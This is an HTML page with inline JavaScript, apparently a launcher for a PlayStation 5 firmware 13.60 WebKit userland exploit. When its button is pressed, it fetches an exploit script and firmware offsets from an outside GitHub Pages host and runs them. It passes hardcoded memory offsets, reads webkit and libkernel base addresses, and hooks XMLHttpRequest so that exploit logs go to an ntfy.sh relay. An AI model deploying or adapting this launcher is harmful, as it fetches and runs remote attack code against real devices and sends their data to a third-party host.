<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
<meta http-equiv="Pragma" content="no-cache">
<meta http-equiv="Expires" content="0">
<title>PS5 13.60 Research Runner 0.5.8</title>
<style>
  html,body{margin:0;background:#07090d;color:#e9eef6;font-family:Arial,sans-serif}
  main{max-width:820px;margin:8vh auto;padding:28px}
  .eyebrow{font-size:12px;letter-spacing:.16em;color:#91a0b8;margin-bottom:8px}
  h1{font-size:28px;margin:0 0 12px}
  p{color:#aeb9ca;line-height:1.5}
  button{font-size:18px;font-weight:700;padding:14px 20px;border:0;border-radius:8px;cursor:pointer}
  #status{margin-top:14px;font-family:monospace;white-space:pre-wrap}
  #scr{margin-top:18px;padding:14px;background:#030507;border:1px solid #1d2633;border-radius:8px;
       height:48vh;overflow:auto;white-space:pre-wrap;font:12px/1.45 monospace}
  #fw-label{font-family:monospace}
</style>
</head>
<body>
<main>
  <div class="eyebrow">RESEARCH BUILD 0.5.8</div>
  <h1 class="header">PS5 13.60 clean userland canary</h1>
  <p id="fw-label">FW 13.60</p>
  <p>One press resets the PSAITO per-session attempt state, loads the upstream userland scripts with verified 13.60 offsets, and runs at most five attempts.</p>
  <button id="run" type="button">Run isolated userland attempt</button>
  <div id="status">Ready.</div>
  <div id="scr">Waiting.</div>
</main>
<script>
(function(){
  "use strict";
  var BUILD="0.5.8";
  var TOPIC="ps5-1360-tumelo-4m7q2v9x6k3n8r5p1d0c";
  var PENDING_KEY="ps5-1360-pending-phase";

  function send(title,msg){
    var base="https://ntfy.sh/"+encodeURIComponent(TOPIC);
    var getUrl=base+"/publish?title="+encodeURIComponent(title)+
      "&message="+encodeURIComponent(msg)+"&tags=computer&_="+Date.now();
    var postUrl=base+"?title="+encodeURIComponent(title)+"&tags=computer&_="+Date.now();

    try{
      if(navigator.sendBeacon) navigator.sendBeacon(postUrl,String(msg));
    }catch(_){}

    try{
      if(typeof fetch==="function")
        fetch(getUrl,{method:"GET",mode:"no-cors",cache:"no-store",keepalive:true})
          .catch(function(){});
    }catch(_){}

    try{
      if(!window.__bootRelayImgs) window.__bootRelayImgs=[];
      var im=new Image();
      window.__bootRelayImgs.push(im);
      im.src=getUrl;
    }catch(_){}
  }

  send("PS5 13.60 PAGE "+BUILD,"page_boot=1\nbuild="+BUILD+"\nfirmware=13.60");

  try{
    var raw=localStorage.getItem(PENDING_KEY);
    if(raw){
      var p=JSON.parse(raw);
      if(p && p.rid && p.message){
        send("PS5 13.60 ADV-A "+p.rid,
          p.message+"\nrecovered=1\nrecovery_build="+BUILD);
      }
    }
  }catch(_){}

  try{
    fetch("version.txt?_="+Date.now(),{cache:"no-store"})
      .then(function(r){return r.text();})
      .then(function(v){
        v=String(v||"").trim();
        if(v && v!==BUILD){
          var next=location.pathname+"?build="+encodeURIComponent(v)+"&_="+Date.now();
          location.replace(next);
        }
      })
      .catch(function(){});
  }catch(_){}
}());
</script>
<script>
(function(){
  "use strict";

  var TOPIC="ps5-1360-tumelo-4m7q2v9x6k3n8r5p1d0c";
  var UP="https://wamphyre.github.io/PSAITO/";
  var REV="6a5170c0df19206837893d57924d39ee4a2e6886";
  var btn=document.getElementById("run");
  var status=document.getElementById("status");

  function runId(){
    return Date.now().toString(36)+"-"+Math.floor(Math.random()*0x7fffffff).toString(36);
  }

  function relay(title,msg){
    var base="https://ntfy.sh/"+encodeURIComponent(TOPIC);
    var getUrl=base+"/publish?title="+encodeURIComponent(title)+
      "&message="+encodeURIComponent(msg)+"&tags=computer&_="+Date.now();
    var postUrl=base+"?title="+encodeURIComponent(title)+"&tags=computer&_="+Date.now();

    try{
      if(navigator.sendBeacon) navigator.sendBeacon(postUrl,String(msg));
    }catch(_){}

    try{
      if(typeof fetch==="function")
        fetch(getUrl,{method:"GET",mode:"no-cors",cache:"no-store",keepalive:true})
          .catch(function(){});
    }catch(_){}

    try{
      if(!window.__relayImgs) window.__relayImgs=[];
      var im=new Image();
      window.__relayImgs.push(im);
      im.src=getUrl;
    }catch(_){}
  }

  function postLog(url,line){
    try{
      var x=new XMLHttpRequest();
      x.open("POST",url,true);
      x.setRequestHeader("Content-Type","text/plain");
      x.send(String(line));
    }catch(_){}
  }

  function loadScript(src){
    return new Promise(function(resolve,reject){
      var s=document.createElement("script");
      s.src=src;
      s.onload=resolve;
      s.onerror=function(){reject(new Error("load failed: "+src));};
      document.head.appendChild(s);
    });
  }

  function wait(ms){
    return new Promise(function(resolve){ setTimeout(resolve,ms); });
  }

  function phase(rid,name,extra){
    var msg="advanced_stage=A\nrun="+rid+"\nfirmware=13.60\nphase="+name+
      (extra ? "\n"+extra : "");
    try{
      localStorage.setItem("ps5-1360-pending-phase",JSON.stringify({
        rid:rid,
        name:name,
        message:msg,
        time:Date.now()
      }));
    }catch(_){}
    relay("PS5 13.60 ADV-A "+rid,msg);
  }

  btn.addEventListener("click",function(){
    btn.disabled=true;
    btn.textContent="Running isolated userland attempt...";
    status.textContent="Resetting PSAITO session state…";
    document.getElementById("scr").textContent="";

    try{
      sessionStorage.removeItem("renderer-notify-auto-proof-2:attempts");
      sessionStorage.removeItem("renderer-notify-auto-proof-2:passed");
      sessionStorage.removeItem("renderer-notify-auto-proof-2:blocked");
      sessionStorage.removeItem("userland-loader-handoff-1:passed");
    }catch(_){}

    var rid=runId();
    var logEndpoint="https://ntfy.sh/"+encodeURIComponent(TOPIC)+
      "?title="+encodeURIComponent("PSAITO-A-"+rid);

    // Mirror critical PSAITO POST log lines through our known-working GET relay.
    // This avoids losing the diagnostic if PS5 WebKit drops the original XHR POST.
    try{
      if(!window.__ps5MirrorInstalled){
        window.__ps5MirrorInstalled=true;
        var _open=XMLHttpRequest.prototype.open;
        var _send=XMLHttpRequest.prototype.send;

        XMLHttpRequest.prototype.open=function(method,url){
          this.__ps5Method=String(method||"").toUpperCase();
          this.__ps5Url=String(url||"");
          return _open.apply(this,arguments);
        };

        XMLHttpRequest.prototype.send=function(body){
          try{
            var text=typeof body==="string" ? body : "";
            var critical=
              text.indexOf("ATTEMPT-")>=0 ||
              text.indexOf("WEBKIT-BASE")>=0 ||
              text.indexOf("KERNEL-")>=0 ||
              text.indexOf("NOTIFY-")>=0 ||
              text.indexOf("MODULE-IMPORT")>=0 ||
              text.indexOf("IMPORT-WINDOW")>=0 ||
              text.indexOf("REQUIREMENTS-")>=0 ||
              text.indexOf("LIBC-")>=0 ||
              text.indexOf("NATIVE-")>=0 ||
              text.indexOf("RW-CARRIER")>=0 ||
              text.indexOf("AUTO-RETRY")>=0 ||
              text.indexOf("SURVIVED-")>=0 ||
              text.indexOf("USERLAND")>=0;
            if(this.__ps5Method==="POST" && text && critical){
              relay("PSAITO-A-"+rid,text);
            }
          }catch(_){}
          return _send.apply(this,arguments);
        };
      }
    }catch(_){}

    phase(rid,"TELEMETRY_MIRROR_READY","build=0.5.8");

    var q=[
      "go=1",
      "fw=13.60",
      "hc="+encodeURIComponent("0x56a58,0x56ca0,0x57ce8"),
      "gd=0x1d6fa",
      "notify=0x48b0",
      "gps=0x334e238",
      "gpe=0x1b860",
      "cls=0x334e228",
      "cle=0x274e0",
      "ers=0x334e230",
      "ere=0xf7d0",
      "log=1",
      "max=1",
      "n=512",
      "rd=8000",
      "lines=260",
      "logserver="+encodeURIComponent(logEndpoint),
      "researchrun="+encodeURIComponent(rid)
    ].join("&");

    try{history.replaceState(null,"",location.pathname+"?"+q);}catch(_){}

    phase(rid,"BUTTON_CLICK","build=0.5.8\nmax=1\nn=512\nbridge=disabled\nvisible_ctx_watch=1\nnotify=0x48b0\ngps=0x334e238");

    var diag = {
      ctxSeen:false,
      callbackSeen:false,
      startedAt:Date.now()
    };

    function showDiag(label, detail) {
      var line = label + (detail ? " — " + detail : "");
      status.textContent = line;
      try {
        localStorage.setItem("ps5-1360-last-stage1-result", line);
      } catch (_) {}
    }

    var ctxWatch = setInterval(function(){
      try{
        if(!diag.ctxSeen && window.__PS5_CTX){
          diag.ctxSeen=true;
          var ctx=window.__PS5_CTX;
          showDiag(
            "CTX DETECTED",
            "webkitBase="+String(ctx.webkitBase||0)+
            " libkernelBase="+String(ctx.libkernelBase||0)
          );
          phase(
            rid,
            "CTX_DETECTED",
            "webkitBase="+String(ctx.webkitBase||0)+
            "\nlibkernelBase="+String(ctx.libkernelBase||0)
          );
        }
      }catch(_){}
    },50);

    window.onUserland=function(){
      diag.callbackSeen=true;
      try{
        var ctx=window.__PS5_CTX || {};
        clearInterval(ctxWatch);
        showDiag(
          "USERLAND HANDOFF CONFIRMED",
          "ctx="+(window.__PS5_CTX ? "yes" : "no")+
          " webkitBase="+String(ctx.webkitBase||0)+
          " libkernelBase="+String(ctx.libkernelBase||0)
        );
        phase(
          rid,
          "USERLAND_HANDOFF",
          "ctx="+(window.__PS5_CTX ? "1" : "0")+
          "\nwebkitBase="+String(ctx.webkitBase||0)+
          "\nlibkernelBase="+String(ctx.libkernelBase||0)
        );
      }catch(e){
        phase(rid,"USERLAND_HANDOFF_ERROR","error="+String(e&&e.message||e).slice(0,160));
      }
    };

    setTimeout(function(){
      try{
        if(diag.callbackSeen) return;
        if(window.__PS5_CTX){
          showDiag("CTX PRESENT / CALLBACK NOT SEEN","bridge disabled; stage-1 context exists");
          phase(rid,"CTX_PRESENT_CALLBACK_NOT_SEEN","bridge=disabled");
        } else {
          showDiag("NO USERLAND HANDOFF","single attempt ended before __PS5_CTX publication");
          phase(rid,"NO_USERLAND_HANDOFF","single_attempt=1");
        }
      }catch(_){}
    },12000);

    status.textContent="Button received. Sending diagnostic marker…";

    wait(1500)
      .then(function(){
        status.textContent="Loading verified 13.60 offsets…";
        return loadScript(UP+"modules/offsets13x.js?v="+REV+"&_="+Date.now());
      })
      .then(function(){
        phase(rid,"OFFSETS_LOADED","n=512\nmax=1\nbridge=disabled");
        status.textContent="Offsets loaded. Starting one isolated exploit attempt in 2 seconds…";
        return wait(2000);
      })
      .then(function(){
        phase(rid,"EXPLOIT_START","n=512\nmax=1\nbridge=disabled");
        status.textContent="Starting isolated PSAITO attempt 1…";
        return wait(1200);
      })
      .then(function(){
        return loadScript(UP+"modules/exploit.js?v="+REV+"&_="+Date.now());
      })
      .then(function(){
        phase(rid,"EXPLOIT_SCRIPT_LOADED");
        status.textContent="Exploit script loaded. Waiting for userland handoff…";
      })
      .catch(function(e){
        phase(rid,"SCRIPT_LOAD_FAILED","error="+String(e&&e.message||e).slice(0,160));
        status.textContent="Script load failed: "+e.message;
        btn.disabled=false;
        btn.textContent="Run isolated userland attempt";
      });
  });
}());
</script>
</body>
</html>
